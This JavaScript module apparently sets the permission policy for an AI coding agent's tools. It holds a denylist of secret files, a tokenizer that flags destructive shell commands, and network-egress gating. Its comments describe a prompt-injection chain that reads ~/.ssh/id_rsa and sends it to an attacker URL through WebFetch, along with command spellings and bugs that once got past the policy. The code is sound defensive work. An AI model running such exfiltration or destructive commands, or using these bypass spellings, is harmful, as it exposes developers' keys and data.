import * as fs from "node:fs";
import * as os from "node:os";
import * as path from "node:path";

/**
 * A política de permissão do motor "Claude Code (assinatura)" — a parte que decide, separada
 * da que fala com o SDK.
 *
 * ## Por que existe como módulo (achado F-13, e F-29 no mesmo movimento)
 *
 * O `claude-runner.mjs` roda ao ser importado, então nada dentro dele era testável: a única
 * prova era o `scripts/prova-montar-prompt.mjs`, que **extrai funções do fonte por regex** e
 * as reexecuta com `new Function` — passa hoje e emudece na primeira mudança de assinatura.
 * A política de permissão, que é a fronteira de segurança desta casca, não tinha prova
 * nenhuma. Aqui ela tem, e o teste é `node --test politica.test.mjs`.
 *
 * ## O que ela fecha
 *
 * `Read` de qualquer caminho e `WebFetch` para qualquer URL eram **automáticos**. Uma injeção
 * de prompt num arquivo do projeto compunha `Read ~/.ssh/id_rsa` → `WebFetch
 * https://atacante/?d=…` sem um cartão de aprovação. O outro motor da mesma casca — o `anna` —
 * mantém `curl`/`wget` fora do automático e tem denylist de segredos; o comentário do runner
 * diz que "um motor não pode ser a porta dos fundos do outro", e era exatamente o que ele era.
 */

/**
 * A denylist de segredos do `anna` (`guard::denied`), na mesma forma — os dois motores
 * recusam a mesma lista.
 *
 * Confinar na pasta do projeto não basta: o `.env` do próprio projeto está dentro dela, e é
 * o primeiro arquivo que uma injeção de prompt vai pedir.
 */
export function caminhoProibido(p) {
  const alvo = String(p ?? "").replace(/\\/g, "/").toLowerCase();
  if (alvo === "") return false;
  const segmentos = alvo.split("/").filter(Boolean);
  const base = segmentos[segmentos.length - 1] ?? alvo;
  // By SEGMENT, not by "/.ssh/" (1.6.13): the substring needed a slash on both sides, so the
  // directory itself — `~/.ssh`, `.aws` — was not protected; only files under it were.
  if (segmentos.some((s) => s === ".git" || s === ".ssh" || s === ".aws")) return true;
  if (base === ".env" || (base.startsWith(".env.") && base !== ".env.example")) return true;
  if (/\.(pem|key|p8|p12|pfx)$/.test(base)) return true;
  if (base.startsWith("id_rsa") || base.startsWith("id_ed25519")) return true;
  return alvo.includes("credentials");
}

/**
 * `~` and `~/…` expanded to the home directory — the way the SDK's CLI does it.
 *
 * 🔴 Until 1.6.13 the fence did not, and the CLI does: `path.resolve(projectDir, "~/.ssh")` is
 * `<projectDir>/~/.ssh`, INSIDE the project, so `Grep {path: "~/.ssh"}` and `Read
 * ~/.config/gh/hosts.yml` were automatic reads at every level — while the bundled `claude`
 * binary (claude-agent-sdk-linux-x64, 17 places, e.g. `if(e==="~"||e.startsWith("~/"))return
 * homedir()+e.slice(1)`) read the real home. `~user` is not expanded by the CLI either.
 */
export function expandirHome(p) {
  const s = String(p ?? "");
  if (s === "~") return os.homedir();
  if (s.startsWith("~/")) return path.join(os.homedir(), s.slice(2));
  return s;
}

/**
 * The real path, following symlinks. A path that does not exist yet (a file about to be
 * written) resolves through its nearest existing ancestor.
 *
 * A symlink committed in a repository — `dados -> ~/.ssh` — is exactly what a malicious clone
 * would bring, and the lexical check reads `dados/config` as inside the project.
 */
export function caminhoReal(abs) {
  const resto = [];
  let atual = abs;
  for (;;) {
    try {
      return path.join(fs.realpathSync(atual), ...resto);
    } catch {
      const pai = path.dirname(atual);
      if (pai === atual) return abs;
      resto.unshift(path.basename(atual));
      atual = pai;
    }
  }
}

/**
 * O caminho pedido está dentro da pasta do projeto?
 *
 * O `cwd` do SDK já confina as ferramentas de arquivo; esta é a nossa cerca, e ela existe
 * porque a política desta casca é código nosso — depender só do comportamento do SDK seria
 * delegar a fronteira para fora, que é o oposto do que o cartão de aprovação promete.
 *
 * Sem caminho declarado devolve `true`: a ferramenta não disse onde vai mexer, então não há
 * o que conferir aqui e quem decide é o `cwd`. Inventar recusa sobre ausência de dado seria
 * pedir cartão para toda listagem sem argumento.
 */
export function dentroDoProjeto(projectDir, p) {
  if (p === undefined || p === null || p === "") return true;
  const raiz = caminhoReal(path.resolve(projectDir));
  const abs = caminhoReal(path.resolve(projectDir, expandirHome(p)));
  return abs === raiz || abs.startsWith(raiz + path.sep);
}

/**
 * Comando que o nível `auto` NÃO engole — a mesma lista de destrutivos do `anna`, onde o
 * "sempre confirma" vale mesmo com o atalho ligado (lá a regra se chama "`t` não vale").
 * Sem isto, `--aprovacao auto` liberava `rm -rf` e `git push --force` sem cartão enquanto o
 * outro motor da mesma casca recusava.
 *
 * ## By tokens, not by spelling (1.6.14) — a port of `anna`'s F-05 fix (SHVIA-CODE 0.11.9)
 *
 * The version before searched substrings (`c.includes("git push")`, `/rm\s+-(rf|fr|r\s+-f)/`).
 * The shell has many spellings for one act, and measured with this policy on 23/09 these were
 * `allow` at the `auto` level: `rm -rvf ~`, `git -C . push --force`, `git  push -f` (two
 * spaces), `git clean -xdf`, `sudo rm -rf /`. Now the command line is split into segments
 * (`;` `|` `&&` `||` newline, and the inside of `$(…)`, backticks and parentheses), quotes are
 * resolved, transparent prefixes (`sudo`, `env`, `xargs`, `FOO=1`…) are skipped, and each
 * segment is judged by its command and its flags. `rm -r` without `-f` counts, as in `anna`: it
 * removes a whole tree just the same. `find -delete` does not, as in `anna` — that is a
 * recorded decision there, not an omission here.
 */
export function comandoDestrutivo(cmd) {
  const baixo = String(cmd ?? "").toLowerCase();
  if (padraoDeLinhaDestrutivo(baixo)) return true;
  return segmentosDeComando(String(cmd ?? "")).some(segmentoDestrutivo);
}

/** Patterns of the whole LINE, not of one command: pipe to a shell, fork bomb, SQL. */
function padraoDeLinhaDestrutivo(c) {
  return /\|\s*(sh|bash)\b/.test(c)
    || c.includes("drop table") || c.includes("truncate table") || c.includes("drop database")
    || c.includes(":(){");
}

/**
 * The command line split into the commands it runs. Quotes are kept (the tokenizer resolves
 * them); `$(…)`, backticks and parentheses open segments of their own, so `echo $(rm -rf /)`
 * cannot hide `rm` as an argument. Redirection stays in the segment, with its target.
 */
export function segmentosDeComando(cmd) {
  const segs = [];
  let atual = "";
  let aspa = null;
  for (let i = 0; i < cmd.length; i++) {
    const ch = cmd[i];
    if (aspa) {
      if (ch === aspa) aspa = null;
      atual += ch;
      continue;
    }
    if (ch === "'" || ch === '"') { aspa = ch; atual += ch; continue; }
    if (ch === ";" || ch === "\n" || ch === "|" || ch === "&") {
      if (cmd[i + 1] === ch) i++;
      segs.push(atual); atual = "";
      continue;
    }
    if (ch === "`" || ch === "(" || ch === ")") { segs.push(atual); atual = ""; continue; }
    if (ch === "$" && cmd[i + 1] === "(") { i++; segs.push(atual); atual = ""; continue; }
    atual += ch;
  }
  segs.push(atual);
  return segs.filter((s) => s.trim() !== "");
}

/** Tokens of a segment with quotes resolved: `cat '.env'` and `cat ".env"` are `cat .env`. */
export function tokensDoSegmento(seg) {
  const out = [];
  let atual = "";
  let aspa = null;
  let tem = false;
  for (const ch of seg) {
    if (aspa) {
      if (ch === aspa) aspa = null; else atual += ch;
      continue;
    }
    if (ch === "'" || ch === '"') { aspa = ch; tem = true; continue; }
    if (/\s/.test(ch)) {
      if (tem || atual !== "") { out.push(atual); atual = ""; tem = false; }
      continue;
    }
    atual += ch;
  }
  if (tem || atual !== "") out.push(atual);
  return out;
}

/** Prefixes that are not the real command — `sudo rm -rf /` is `rm -rf /`. */
const PREFIXOS_TRANSPARENTES = new Set(["sudo", "doas", "env", "command", "nohup", "time", "exec", "xargs"]);
/** Options of THOSE prefixes that take a value in the next token (`sudo -u root rm …`). */
const OPCOES_COM_VALOR = new Set(["-u", "-g", "-p", "-t", "-c", "-r", "-h", "-n", "-i", "-d", "-a", "-s", "-e", "-l"]);

/** The command (basename, lowercase) and its arguments, past prefixes and `KEY=value`. */
export function comandoEArgs(seg) {
  const toks = tokensDoSegmento(seg);
  let i = 0;
  while (i < toks.length) {
    const t = toks[i].toLowerCase();
    const eq = t.indexOf("=");
    if (eq > 0 && /^[a-z0-9_]+$/.test(t.slice(0, eq))) { i++; continue; }
    if (PREFIXOS_TRANSPARENTES.has(t)) {
      i++;
      while (i < toks.length && toks[i].startsWith("-")) {
        const opc = toks[i].toLowerCase();
        i++;
        if (OPCOES_COM_VALOR.has(opc) && i < toks.length) i++;
      }
      continue;
    }
    break;
  }
  if (i >= toks.length) return null;
  const cmd = toks[i].toLowerCase();
  const nome = cmd.split(/[\\/]/).pop();
  return { cmd: nome, args: toks.slice(i + 1) };
}

/** Does any grouped short flag (`-rvf`) or long flag (`--recursive`) carry this one? */
function temFlag(args, curta, longas) {
  return args.some((a0) => {
    const a = a0.toLowerCase();
    if (a.startsWith("--")) return longas.includes(a.slice(2).split("=")[0]);
    if (a.startsWith("-")) {
      const curtas = a.slice(1);
      return curtas !== "" && /^[a-z0-9]+$/.test(curtas) && curtas.includes(curta);
    }
    return false;
  });
}

/** git's subcommand, past the global options — `-C <dir>`, `-c k=v`, `--git-dir <x>` take a value. */
function gitSubcomando(args) {
  let i = 0;
  while (i < args.length) {
    const a = args[i].toLowerCase();
    if (["-c", "--git-dir", "--work-tree", "--namespace", "--exec-path"].includes(a)) { i += 2; continue; }
    if (a.startsWith("-")) { i++; continue; }
    return { sub: a, resto: args.slice(i + 1) };
  }
  return null;
}

function segmentoDestrutivo(seg) {
  const ca = comandoEArgs(seg);
  if (!ca) return false;
  const { cmd, args } = ca;
  if (cmd === "rm") return temFlag(args, "r", ["recursive", "dir"]);
  if (cmd.startsWith("mkfs")) return true;
  if (cmd === "dd") return true;
  if (cmd === "chmod") return temFlag(args, "r", ["recursive"]) && args.some((a) => a.includes("777"));
  if (cmd === "git") {
    const g = gitSubcomando(args);
    if (!g) return false;
    if (g.sub === "push") return true;
    if (g.sub === "reset") return g.resto.some((a) => a.toLowerCase() === "--hard");
    if (g.sub === "clean") return temFlag(g.resto, "f", ["force"]);
  }
  return false;
}

/**
 * READ tools — the only ones this policy clears without a card, and even then only after
 * the fence (`caminhoProibido` and `dentroDoProjeto` are evaluated first).
 *
 * 🔴 `WebFetch` and `WebSearch` are NOT here, and the absence is the decision (finding
 * F-13, ADR-032). They are not reads: they are **network egress**, the half that closes
 * the chain. With `Read` of any path and `WebFetch` to any URL both automatic, a prompt
 * injection in a project file composed `Read ~/.ssh/id_rsa` → `WebFetch
 * https://attacker/?d=…` without a single approval card.
 */
export const LEITURA = new Set([
  "Read", "Glob", "Grep", "LS", "NotebookRead", "TodoWrite",
]);

/**
 * EDIT tools — what the `edit` and `auto` levels clear without a card.
 *
 * 🔴 This set used to live in `claude-runner.mjs` as `EDIT_TOOLS` and **vanished in
 * 1.4.7**, when the policy was extracted into this module: the definition left, the
 * reference stayed. `preToolUse` builds the literal `{ …, edicao: EDIT_TOOLS }` BEFORE
 * calling `decidir()`, and an undeclared name in ESM is a `ReferenceError` — so the hook
 * threw on EVERY tool call, at every level. The ADR-032 security boundary was off the
 * air, and nothing said so.
 *
 * ⚠️ Why nobody saw it, and why both sets now live HERE: `politica.test.mjs` declared its
 * own local copies of the read and edit sets and exercised `decidir()` with those. The
 * proof never touched the file where the name was missing — two copies of one fact, and
 * the test happened to hold the correct one. A single source, imported by both, is what
 * stops the next divergence.
 */
export const EDICAO = new Set(["Write", "Edit", "MultiEdit", "NotebookEdit"]);

/** Ferramentas de leitura cujo alvo é um CAMINHO — as que a cerca confina. */
export const PATH_ARG = {
  Read: "file_path",
  Glob: "path",
  Grep: "path",
  LS: "path",
  NotebookRead: "notebook_path",
};

/**
 * O veredito, em uma função pura — é ela que o teste exercita e o runner obedece.
 *
 * Devolve `{ acao: "allow"|"gate", motivo, politica? }`. Nunca `deny`: o que esta política não
 * libera vira **cartão**, não recusa — quem nega é o dev, olhando o preview.
 *
 * ## `politica`: which card, and why it is part of the verdict (1.6.12)
 *
 * 🔴 A card is not a decision by itself: the PAGE decides what to do with it. Its Auto mode —
 * the default, `localStorage.getItem('shvia.codeApproval') || 'auto'` in SHVIA-WEB's
 * code-mode.js — approves by itself every `confirm` card it judges "inside the project", and
 * measured on 23/09 with the page's own functions it judged these inside: `WebFetch
 * https://attacker/?d=…`, `Read .env`, `Read /etc/passwd`, `git push --force`. Until 1.6.12
 * every card here was `confirm`, so in the default mode the ADR-032 boundary was off: the
 * cards were emitted, and approved by nobody. The tests above stayed green because they
 * checked that the card is EMITTED, not what happens to it.
 *
 * `always` is the one policy the page never auto-approves and never offers "Sempre" for. So
 * every card ADR-032 says asks "at any level" — network egress, a protected path, a
 * destructive command — carries `always`. A card that only means "outside this project"
 * stays `confirm`; the page judges that from the preview (see `previa`).
 */
export function decidir({ projectDir, toolName, toolInput = {}, nivel = "manual", leitura, edicao }) {
  if (leitura.has(toolName)) {
    const alvo = toolInput[PATH_ARG[toolName]];
    // The denylist is checked on what was ASKED and on where it really LEADS — `~` expanded,
    // symlinks followed. Inside the project the real path is judged relative to the root, so
    // a project folder named `credentials-service` does not make every file protected.
    let real = "";
    if (alvo !== undefined && alvo !== null && alvo !== "") {
      const raiz = caminhoReal(path.resolve(projectDir));
      const abs = caminhoReal(path.resolve(projectDir, expandirHome(alvo)));
      real = abs.startsWith(raiz + path.sep) ? path.relative(raiz, abs) : abs;
    }
    if (caminhoProibido(alvo) || caminhoProibido(real)) {
      return { acao: "gate", motivo: `leitura de caminho protegido (${alvo})`, politica: "always" };
    }
    if (!dentroDoProjeto(projectDir, alvo)) {
      return { acao: "gate", motivo: `leitura fora da pasta do projeto (${alvo})`, politica: "confirm" };
    }
    return { acao: "allow", motivo: "leitura (auto)" };
  }
  if (toolName === "WebFetch" || toolName === "WebSearch") {
    return { acao: "gate", motivo: "saída para a rede", politica: "always" };
  }
  if (toolName === "Bash" && comandoDestrutivo(toolInput.command)) {
    return { acao: "gate", motivo: "comando destrutivo", politica: "always" };
  }
  if (nivel !== "manual" && edicao.has(toolName)) {
    return { acao: "allow", motivo: `edição liberada pelo nível "${nivel}"` };
  }
  if (nivel === "auto") {
    return { acao: "allow", motivo: 'liberado pelo nível "auto"' };
  }
  return { acao: "gate", motivo: "", politica: "confirm" };
}

/**
 * The card's preview — what the dev reads, and what the page's "inside the project?" check
 * parses. It lives here, beside `decidir`, because the two must agree: a verdict of
 * "outside the project" is only honored if the page can SEE the path.
 *
 * 🔴 Until 1.6.12 a read tool fell into the generic branch, `Read {"file_path":"/etc/passwd"}`.
 * The page's check looks for an absolute path, `~` or `..` as a whitespace-separated token;
 * inside JSON the path follows a `"`, so `Read /etc/passwd` read as "inside" and was
 * auto-approved. A read shows its path as its own token now; the full input goes in `why`.
 */
export function previa(toolName, input) {
  const inp = input || {};
  if (toolName === "Bash") {
    return {
      kind: "command",
      command: String(inp.command ?? ""),
      why: String(inp.description ?? ""),
    };
  }
  if (PATH_ARG[toolName] && inp[PATH_ARG[toolName]]) {
    return {
      kind: "command",
      command: `${toolName} ${String(inp[PATH_ARG[toolName]])}`,
      why: JSON.stringify(inp),
    };
  }
  if (toolName === "Write") {
    const path = String(inp.file_path ?? inp.path ?? "");
    const body = String(inp.content ?? "");
    const diff = body.split("\n").map((l) => "+ " + l).join("\n");
    return { kind: "diff", path, diff };
  }
  if (toolName === "Edit" || toolName === "MultiEdit") {
    const path = String(inp.file_path ?? "");
    const edits =
      toolName === "MultiEdit"
        ? inp.edits ?? []
        : [{ old_string: inp.old_string, new_string: inp.new_string }];
    const diff = edits
      .map((e) => {
        const oldL = String(e?.old_string ?? "").split("\n").map((l) => "- " + l).join("\n");
        const newL = String(e?.new_string ?? "").split("\n").map((l) => "+ " + l).join("\n");
        return [oldL, newL].filter(Boolean).join("\n");
      })
      .join("\n");
    return { kind: "diff", path, diff };
  }
  // fallback: descreve a chamada como comando (visível no card)
  return { kind: "command", command: `${toolName} ${JSON.stringify(inp)}`, why: "" };
}
